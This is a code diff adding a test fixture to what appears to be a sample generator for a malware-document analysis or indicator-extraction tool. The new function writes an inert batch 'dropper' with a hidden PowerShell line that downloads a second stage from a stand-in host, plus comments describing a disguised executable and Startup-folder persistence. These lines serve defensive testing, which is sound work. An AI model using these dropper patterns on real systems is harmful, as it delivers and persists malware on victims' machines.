@@ -983,6 +983,27 @@ def dropper_bundle_zip() -> bytes:
 
 # --- main -----------------------------------------------------------------------------
 
+def ioc_noise_bat() -> bytes:
+    """Batch dropper whose comments carry IOC *noise* the extractor must drop:
+    tool self-URLs, binary-garbage "paths", escaped byte runs and the app's own
+    install path. The real indicators (inert) must still be reported."""
+    lines = [
+        "@echo off",
+        "rem invoice-2024-0613 payment helper",
+        "rem real: download stage2 from http://billing-portal.example/inv/stage2.ps1",
+        r"rem real: copy to C:\Users\Public\Documents\invoice_view.exe",
+        r"rem real: persist via %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\inv.lnk",
+        "rem noise: see https://github.com/decalage2/oletools/wiki and http://decalage.info/python/oletools",
+        "rem noise: colors by https://github.com/borntyping/python-colorlog",
+        r"rem noise: C:\a\x4d\x5a\x90\x00",
+        "rem noise: C:\\\xc3\xa2\xc3\xa3\xc3\xa4\xc3\xa5\\data",
+        r"rem noise: C:\Tools\DocuTraceX\tools\python\python.exe",
+        "powershell -nop -w hidden -c \"iwr http://billing-portal.example/inv/stage2.ps1\"",
+        "",
+    ]
+    return "\r\n".join(lines).encode("utf-8")
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -991,7 +1012,7 @@ def build_all() -> dict[str, bytes]:
         "sample.eml": eml_doc(), "sample.emlx": emlx_doc(), "sample.msg": msg_doc(),
         "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
         "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
-        "sample_dropper.bat": dropper_bat(), "sample_loader.hta": loader_hta(),
+        "sample_dropper.bat": dropper_bat(), "sample_ioc_noise.bat": ioc_noise_bat(), "sample_loader.hta": loader_hta(),
         "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
         "sample_installer.msi": installer_msi(),
         "sample_dropper.py": dropper_py(), "sample_dropper.pyc": dropper_pyc(),
